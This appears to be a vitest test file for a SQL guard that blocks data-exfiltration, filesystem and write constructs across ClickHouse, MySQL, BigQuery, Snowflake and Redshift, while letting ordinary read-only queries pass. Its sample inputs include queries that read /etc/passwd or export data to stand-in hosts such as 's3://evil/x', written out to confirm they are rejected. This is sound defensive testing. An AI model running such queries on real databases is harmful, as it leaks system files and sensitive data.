import { describe, it, expect } from 'vitest'
import { assertNoDangerousSql, SqlGuardError } from './sql-guard'

const ok = (q: string, d: string) => expect(() => assertNoDangerousSql(q, d)).not.toThrow()
const blocked = (q: string, d: string) => expect(() => assertNoDangerousSql(q, d)).toThrow(SqlGuardError)

describe('sql-guard: ClickHouse table functions', () => {
  it('blocks url/remote/s3/file/mysql/postgresql table functions', () => {
    blocked("SELECT * FROM url('http://evil/x','CSV')", 'clickhouse')
    blocked('SELECT * FROM remote(\'host:9000\', db.t)', 'clickhouse')
    blocked("SELECT * FROM s3('https://b/k','CSV')", 'clickhouse')
    blocked("SELECT * FROM file('/etc/passwd','LineAsString')", 'clickhouse')
    blocked('SELECT * FROM mysql(\'h:3306\',\'db\',\'t\',\'u\',\'p\')', 'clickhouse')
    blocked("SELECT * FROM postgresql('h:5432','db','t','u','p')", 'clickhouse')
  })
  it('blocks a SETTINGS clause', () => {
    blocked('SELECT * FROM prod SETTINGS max_result_rows=0', 'clickhouse')
  })
  it('allows an ordinary SELECT over real tables', () => {
    ok('SELECT ts, sum(units) FROM production GROUP BY ts', 'clickhouse')
    ok('WITH x AS (SELECT 1) SELECT * FROM x', 'clickhouse')
  })
  it('does not trip on a column/value that merely contains a function name', () => {
    ok("SELECT file_name FROM docs WHERE note = 'uploaded via s3(x)'", 'clickhouse')
    ok('SELECT url FROM pages', 'clickhouse')   // url as a column, not url(
  })
})

describe('sql-guard: MySQL filesystem constructs', () => {
  it('blocks INTO OUTFILE / DUMPFILE / LOAD_FILE', () => {
    blocked("SELECT * FROM t INTO OUTFILE '/tmp/x'", 'mysql')
    blocked("SELECT LOAD_FILE('/etc/passwd')", 'mysql')
  })
  it('allows a normal SELECT', () => {
    ok('SELECT a, b FROM t WHERE a > 1', 'mysql')
  })
})

describe('sql-guard: BigQuery write/exfiltration constructs', () => {
  it('blocks EXPORT DATA (write to GCS)', () => {
    blocked("EXPORT DATA OPTIONS(uri='gs://b/*') AS SELECT * FROM t", 'bigquery')
  })
  it('blocks DML/DDL', () => {
    blocked('INSERT INTO `p.d.t` (a) VALUES (1)', 'bigquery')
    blocked('CREATE TABLE `p.d.t2` AS SELECT 1', 'bigquery')
    blocked('DELETE FROM `p.d.t` WHERE a=1', 'bigquery')
    blocked('MERGE `p.d.t` USING `p.d.s` ON TRUE WHEN MATCHED THEN DELETE', 'bigquery')
  })
  it('allows read-only SELECT / WITH with fully-qualified tables', () => {
    ok('SELECT a, COUNT(*) FROM `proj.ds.events` GROUP BY a', 'bigquery')
    ok('WITH x AS (SELECT 1 AS a) SELECT a FROM x', 'bigquery')
  })
  it('does not trip on a value/column containing a keyword', () => {
    ok("SELECT note FROM `p.d.t` WHERE note = 'please export data later'", 'bigquery')
    ok('SELECT create_time, update_count FROM `p.d.t`', 'bigquery')
  })
})

describe('sql-guard: Snowflake write/exfiltration constructs', () => {
  it('blocks COPY INTO (stage / cloud storage)', () => {
    blocked("COPY INTO @my_stage/data FROM (SELECT * FROM t)", 'snowflake')
    blocked("COPY INTO 's3://b/k' FROM t", 'snowflake')
  })
  it('blocks DML/DDL and PUT/REMOVE', () => {
    blocked('INSERT INTO t VALUES (1)', 'snowflake')
    blocked('CREATE TABLE t2 AS SELECT 1', 'snowflake')
    blocked('PUT file:///tmp/x @stage', 'snowflake')
  })
  it('allows read-only SELECT / WITH', () => {
    ok('SELECT a, COUNT(*) FROM orders GROUP BY a QUALIFY ROW_NUMBER() OVER (ORDER BY a) = 1', 'snowflake')
    ok('WITH x AS (SELECT 1 AS a) SELECT a FROM x', 'snowflake')
  })
  it('does not trip on a value/column containing a keyword', () => {
    ok("SELECT note FROM t WHERE note = 'please copy into the sheet'", 'snowflake')
    ok('SELECT create_date, put_option FROM t', 'snowflake')
  })
})

describe('sql-guard: Redshift exfiltration constructs', () => {
  it('blocks UNLOAD (export to S3)', () => {
    blocked("SELECT 1; UNLOAD ('select * from t') TO 's3://b/k' IAM_ROLE 'arn'", 'redshift')
    blocked("UNLOAD('select * from sales') TO 's3://evil/x'", 'redshift')
  })
  it('blocks SELECT … INTO (materialises a table)', () => {
    blocked('SELECT a, b INTO new_table FROM t', 'redshift')
    blocked('SELECT * INTO #temp FROM t', 'redshift')
  })
  it('allows ordinary SELECT / WITH / aggregations', () => {
    ok('SELECT date_trunc(\'day\', ts) d, sum(units) FROM production GROUP BY 1', 'redshift')
    ok('WITH x AS (SELECT 1) SELECT * FROM x', 'redshift')
    ok("SELECT * FROM orders WHERE region ILIKE '%east%' LIMIT 100", 'redshift')
  })
  it('does not trip on a value/column that merely contains the word into/unload', () => {
    ok("SELECT note FROM docs WHERE note = 'loaded into the warehouse'", 'redshift')
    ok('SELECT unload_count FROM metrics', 'redshift')
  })
})

describe('sql-guard: other dialects unaffected', () => {
  it('does not block ClickHouse functions on postgres (handled by its own grants)', () => {
    ok("SELECT * FROM url('x')", 'postgres')   // not clickhouse → this guard is a no-op; pg has no url() anyway
  })
})
